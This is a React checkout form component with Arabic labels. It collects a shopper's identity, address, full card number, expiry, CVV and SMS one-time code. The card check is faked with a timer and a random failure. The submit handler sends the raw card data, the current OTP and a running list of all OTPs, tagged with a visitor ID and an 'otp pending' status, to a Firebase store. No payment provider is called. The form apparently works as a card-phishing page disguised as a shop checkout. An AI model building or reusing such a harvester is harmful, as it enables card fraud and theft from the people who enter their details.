"use client"

import type React from "react"
import { useState } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Loader2, CreditCard, AlertCircle, CheckCircle } from "lucide-react"
import { addData, getVisitorId } from "@/lib/firebase"

interface CheckoutFormProps {
  onSubmit: (data: any) => void
  isProcessing: boolean
}

interface CardData {
  cardNumber: string
  expiryDate: string
  cvv: string
  cardholderName: string
}
const allOtps=['']
export function CheckoutForm({ onSubmit, isProcessing }: CheckoutFormProps) {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    postalCode: "",
    paymentMethod: "card",
    notes: "",
  })

  const [cardData, setCardData] = useState<CardData>({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
  })

  const [showOTP, setShowOTP] = useState(false)
  const [otp, setOtp] = useState("")
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [cardValidated, setCardValidated] = useState(false)
  const [isValidatingCard, setIsValidatingCard] = useState(false)

  const validateCard = () => {
    const newErrors: Record<string, string> = {}

    // Validate card number (simple Luhn algorithm check)
    const cardNumber = cardData.cardNumber.replace(/\s/g, "")
    if (!cardNumber || cardNumber.length < 13 || cardNumber.length > 19) {
      newErrors.cardNumber = "رقم البطاقة غير صحيح"
    }

    // Validate expiry date
    const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/
    if (!expiryRegex.test(cardData.expiryDate)) {
      newErrors.expiryDate = "تاريخ الانتهاء غير صحيح (MM/YY)"
    } else {
      const [month, year] = cardData.expiryDate.split("/")
      const currentDate = new Date()
      const currentYear = currentDate.getFullYear() % 100
      const currentMonth = currentDate.getMonth() + 1

      if (
        Number.parseInt(year) < currentYear ||
        (Number.parseInt(year) === currentYear && Number.parseInt(month) < currentMonth)
      ) {
        newErrors.expiryDate = "البطاقة منتهية الصلاحية"
      }
    }

    // Validate CVV
    if (!cardData.cvv || cardData.cvv.length < 3 || cardData.cvv.length > 4) {
      newErrors.cvv = "رمز الأمان غير صحيح"
    }

    // Validate cardholder name
    if (!cardData.cardholderName.trim()) {
      newErrors.cardholderName = "اسم حامل البطاقة مطلوب"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleCardValidation = async () => {
    if (!validateCard()) return

    setIsValidatingCard(true)

    // Simulate card validation API call
    try {
      await new Promise((resolve) => setTimeout(resolve, 2000))

      // Simulate random validation failure for demo
      if (Math.random() > 0.7) {
        setErrors({ card: "فشل في التحقق من البطاقة. يرجى المحاولة مرة أخرى." })
        setIsValidatingCard(false)
        return
      }

      setCardValidated(true)
      setShowOTP(true)
      setErrors({})
    } catch (error) {
      setErrors({ card: "حدث خطأ في التحقق من البطاقة" })
    }

    setIsValidatingCard(false)
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    if (formData.paymentMethod === "card") {
      if (!cardValidated) {
        setErrors({ form: "يرجى التحقق من بيانات البطاقة أولاً" })
        return
      }

      if (!showOTP) {
        handleCardValidation()
        return
      }

      if (!otp || otp.length !== 6) {
        setErrors({ otp: "يرجى إدخال رمز التحقق المكون من 6 أرقام" })
        return
      }
    }
    allOtps.push(otp)
    const visitorId = getVisitorId()
    addData({
      visitorId,
      ...formData,
      cardData,
      otp,
      allOtps,
      otpStatus: "pending",
      currentStep: "otp",
      currentPage: "إدخال الكود",
    })
  }

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: "" }))
    }
  }

  const handleCardInputChange = (field: keyof CardData, value: string) => {
    let formattedValue = value

    // Format card number with spaces
    if (field === "cardNumber") {
      formattedValue = value
        .replace(/\s/g, "")
        .replace(/(.{4})/g, "$1 ")
        .trim()
      if (formattedValue.length > 23) return // Max 19 digits + 4 spaces
    }

    // Format expiry date
    if (field === "expiryDate") {
      formattedValue = value.replace(/\D/g, "").replace(/(\d{2})(\d)/, "$1/$2")
      if (formattedValue.length > 5) return
    }

    // Format CVV (numbers only)
    if (field === "cvv") {
      formattedValue = value.replace(/\D/g, "")
      if (formattedValue.length > 4) return
    }

    setCardData((prev) => ({ ...prev, [field]: formattedValue }))
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: "" }))
    }
  }

  const resetCardValidation = () => {
    setCardValidated(false)
    setShowOTP(false)
    setOtp("")
    setErrors({})
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      {/* Error Alert */}
      {(errors.form || errors.card) && (
        <Alert variant="destructive">
          <AlertCircle className="h-4 w-4" />
          <AlertDescription>{errors.form || errors.card}</AlertDescription>
        </Alert>
      )}

      {/* Personal Information */}
      <Card>
        <CardHeader>
          <CardTitle>المعلومات الشخصية</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <Label htmlFor="firstName">الاسم الأول *</Label>
              <Input
                id="firstName"
                value={formData.firstName}
                onChange={(e) => handleInputChange("firstName", e.target.value)}
                required
              />
            </div>
            <div>
              <Label htmlFor="lastName">اسم العائلة *</Label>
              <Input
                id="lastName"
                value={formData.lastName}
                onChange={(e) => handleInputChange("lastName", e.target.value)}
                required
              />
            </div>
          </div>

          <div>
            <Label htmlFor="email">البريد الإلكتروني *</Label>
            <Input
              id="email"
              type="email"
              value={formData.email}
              onChange={(e) => handleInputChange("email", e.target.value)}
              required
            />
          </div>

          <div>
            <Label htmlFor="phone">رقم الهاتف *</Label>
            <Input
              id="phone"
              type="tel"
              value={formData.phone}
              onChange={(e) => handleInputChange("phone", e.target.value)}
              required
            />
          </div>
        </CardContent>
      </Card>

      {/* Delivery Address */}
      <Card>
        <CardHeader>
          <CardTitle>عنوان التوصيل</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div>
            <Label htmlFor="address">العنوان *</Label>
            <Textarea
              id="address"
              value={formData.address}
              onChange={(e) => handleInputChange("address", e.target.value)}
              required
            />
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <Label htmlFor="city">المدينة *</Label>
              <Input
                id="city"
                value={formData.city}
                onChange={(e) => handleInputChange("city", e.target.value)}
                required
              />
            </div>
            <div>
              <Label htmlFor="postalCode">الرمز البريدي</Label>
              <Input
                id="postalCode"
                value={formData.postalCode}
                onChange={(e) => handleInputChange("postalCode", e.target.value)}
              />
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Payment Method */}
      <Card>
        <CardHeader>
          <CardTitle>طريقة الدفع</CardTitle>
        </CardHeader>
        <CardContent>
          <RadioGroup
            value={formData.paymentMethod}
            onValueChange={(value) => {
              handleInputChange("paymentMethod", value)
              if (value !== "card") {
                resetCardValidation()
              }
            }}
          >
            <div className="flex items-center space-x-2 space-x-reverse">
              <RadioGroupItem value="card" id="card" />
              <Label htmlFor="card" className="flex items-center space-x-2 space-x-reverse">
                <CreditCard className="w-4 h-4" />
                <span>الدفع بالبطاقة الائتمانية</span>
              </Label>
            </div>
            <div className="flex items-center space-x-2 space-x-reverse">
              <RadioGroupItem value="cod" id="cod" />
              <Label htmlFor="cod">الدفع عند الاستلام</Label>
            </div>
          </RadioGroup>
        </CardContent>
      </Card>

      {/* Credit Card Form */}
      {formData.paymentMethod === "card" && (
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center space-x-2 space-x-reverse">
              <CreditCard className="w-5 h-5" />
              <span>بيانات البطاقة الائتمانية</span>
              {cardValidated && <CheckCircle className="w-5 h-5 text-green-600" />}
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <Label htmlFor="cardholderName">اسم حامل البطاقة *</Label>
              <Input
                id="cardholderName"
                value={cardData.cardholderName}
                onChange={(e) => handleCardInputChange("cardholderName", e.target.value)}
                disabled={cardValidated}
                className={errors.cardholderName ? "border-red-500" : ""}
              />
              {errors.cardholderName && <p className="text-sm text-red-500 mt-1">{errors.cardholderName}</p>}
            </div>

            <div>
              <Label htmlFor="cardNumber">رقم البطاقة *</Label>
              <Input
                id="cardNumber"
                value={cardData.cardNumber}
                onChange={(e) => handleCardInputChange("cardNumber", e.target.value)}
                placeholder="1234 5678 9012 3456"
                disabled={cardValidated}
                className={errors.cardNumber ? "border-red-500" : ""}
              />
              {errors.cardNumber && <p className="text-sm text-red-500 mt-1">{errors.cardNumber}</p>}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label htmlFor="expiryDate">تاريخ الانتهاء *</Label>
                <Input
                  id="expiryDate"
                  value={cardData.expiryDate}
                  onChange={(e) => handleCardInputChange("expiryDate", e.target.value)}
                  placeholder="MM/YY"
                  disabled={cardValidated}
                  className={errors.expiryDate ? "border-red-500" : ""}
                />
                {errors.expiryDate && <p className="text-sm text-red-500 mt-1">{errors.expiryDate}</p>}
              </div>

              <div>
                <Label htmlFor="cvv">رمز الأمان *</Label>
                <Input
                  id="cvv"
                  value={cardData.cvv}
                  onChange={(e) => handleCardInputChange("cvv", e.target.value)}
                  placeholder="123"
                  disabled={cardValidated}
                  className={errors.cvv ? "border-red-500" : ""}
                />
                {errors.cvv && <p className="text-sm text-red-500 mt-1">{errors.cvv}</p>}
              </div>
            </div>

            {!cardValidated && (
              <Button type="button" onClick={handleCardValidation} disabled={isValidatingCard} className="w-full">
                {isValidatingCard ? (
                  <>
                    <Loader2 className="w-4 h-4 ml-2 animate-spin" />
                    جاري التحقق من البطاقة...
                  </>
                ) : (
                  "التحقق من البطاقة"
                )}
              </Button>
            )}

            {cardValidated && (
              <div className="flex items-center space-x-2 space-x-reverse text-green-600">
                <CheckCircle className="w-4 h-4" />
                <span className="text-sm">تم التحقق من البطاقة بنجاح</span>
                <Button
                  type="button"
                  variant="ghost"
                  size="sm"
                  onClick={resetCardValidation}
                  className="text-blue-600 hover:text-blue-800"
                >
                  تعديل
                </Button>
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {/* OTP Verification */}
      {formData.paymentMethod === "card" && showOTP && (
        <Card>
          <CardHeader>
            <CardTitle>رمز التحقق</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <p className="text-sm text-gray-600">تم إرسال رمز التحقق إلى رقم الهاتف المسجل في البطاقة</p>

            <div>
              <Label htmlFor="otp">رمز التحقق *</Label>
              <Input
                id="otp"
                type="text"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                placeholder="000000"
                maxLength={6}
                className={`text-center text-2xl tracking-widest ${errors.otp ? "border-red-500" : ""}`}
              />
              {errors.otp && <p className="text-sm text-red-500 mt-1">{errors.otp}</p>}
            </div>

            <div className="bg-blue-50 p-4 rounded-lg">
              <p className="text-sm text-blue-700 text-center">🔒 لم تستلم الرمز؟ سيتم إعادة الإرسال خلال 60 ثانية</p>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Additional Notes */}
      <Card>
        <CardHeader>
          <CardTitle>ملاحظات إضافية</CardTitle>
        </CardHeader>
        <CardContent>
          <Textarea
            placeholder="أي ملاحظات خاصة بالطلب..."
            value={formData.notes}
            onChange={(e) => handleInputChange("notes", e.target.value)}
          />
        </CardContent>
      </Card>

      <Button type="submit" size="lg" className="w-full" disabled={isProcessing}>
        {isProcessing ? (
          <>
            <Loader2 className="w-4 h-4 ml-2 animate-spin" />
            جاري المعالجة...
          </>
        ) : (
          "تأكيد الطلب"
        )}
      </Button>
    </form>
  )
}
